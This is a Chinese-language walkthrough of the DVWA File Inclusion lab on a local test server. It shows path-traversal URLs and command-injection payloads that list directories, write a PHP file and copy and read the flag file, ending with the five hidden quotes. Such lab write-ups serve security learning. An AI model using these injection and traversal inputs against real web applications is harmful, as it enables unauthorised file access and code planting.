# File Inclusion

> Objective
>
>
> Read all five famous quotes from '[../hackable/flags/fi.php](http://localhost:8086/hackable/flags/fi.php)' using only the file inclusion.
>

### 觀察

```bash
[../hackable/flags/fi.php](http://localhost:8086/hackable/flags/fi.php)
```

```bash
http://localhost:8086/hackable/flags/fi.php
```

無法用之前的方法 include，不論是直接存取上上層或遠端載入，該怎麼辦 ? 😮‍💨

```bash
http://localhost:8086/vulnerabilities/fi/?page=../../hackable/flags/fi.php
```

```bash
localhost:8086/vulnerabilities/fi/?page=http://localhost:8086/hackable/flags/fi.php
```

先透過 command injection 偷看確認一下這題的檔案

```bash
& ls ../fi
```
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/fffcff98-2cc1-4a47-bb37-a6652531f014/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T120559Z&X-Amz-Expires=86400&X-Amz-Signature=992d3149d9c27d0d7c8f1e0e9fd8d760713763d80ba9574d44694265bedd92a8&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

其實這邊也可以都一隻 web shell 進去，方便瀏覽檔案，不過既然題目說要用 file inclusion，那就不用這招了

接著產生一隻檔案到 `vulnerabilities/fi` 裡測試看看

```bash
& echo "<?php phpinfo(); ?>" > ../fi/yo.php
```

```bash
http://localhost:8086/vulnerabilities/fi/yo.php
```

### Done

做到這邊突然想到，既然它只讀取 `fi` 資料夾的檔案，那我們直接把 `http://localhost:8086/hackable/flags/fi.php` 複製到`http://localhost:8086/vulnerabilities/fi/` 不就好了😹

當然你也可以產生一隻可以讀取任何檔案的 php file 在 `http://localhost:8086/vulnerabilities/fi/` 資料夾內，再讓它讀取任何檔案

```bash
& cp ../../hackable/flags/fi.php ../fi/
```

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/46b84263-c125-46a4-b391-5be6feee89d8/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T120701Z&X-Amz-Expires=86400&X-Amz-Signature=70f37cca3eceed32c02651a654c9421874360d2b6789c189d856a09e02a51c44&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

```bash
&ls ../fi
```

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/67a614cc-7c27-4be8-97e3-2b935844e0a9/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T120719Z&X-Amz-Expires=86400&X-Amz-Signature=670fc99340e7edaef1869af60caf662ff7876d9f1fbabf09492b003a2b69b9fe&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

```
http://localhost:8086/vulnerabilities/fi/?page=fi.php
```
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/db4f7ecd-59a6-4721-9553-a152ce38e436/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T120749Z&X-Amz-Expires=86400&X-Amz-Signature=349d427a99c093de9683f2457c6d38eb8ec9fe59a46dd77e944c2039583c8188&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

接下來的流程就跟 low 一樣， `5.)` 從 page source 就能看到， `3.)` 從 command injection 用 cat 指令就能看到

```bash
&cat ../../hackable/flags/fi.php
```
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/d19dc1b4-fa02-490c-9fc0-c35638154568/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220215%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220215T120816Z&X-Amz-Expires=86400&X-Amz-Signature=8341c089bd4cfc8b8512ab71fff1a4d3871554f6240dd946e7d449bec4c06c03&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

```
1.) Bond. James Bond 
2.) My name is Sherlock Holmes. It is my business to know what other people don't know.
3.) Romeo, Romeo! Wherefore art thou Romeo?
4.) The pool on the roof must have a leak.
5.) The world isn't run by weapons anymore, or energy, or money. It's run by little ones and zeroes, little bits of data. It's all just electrons.
```
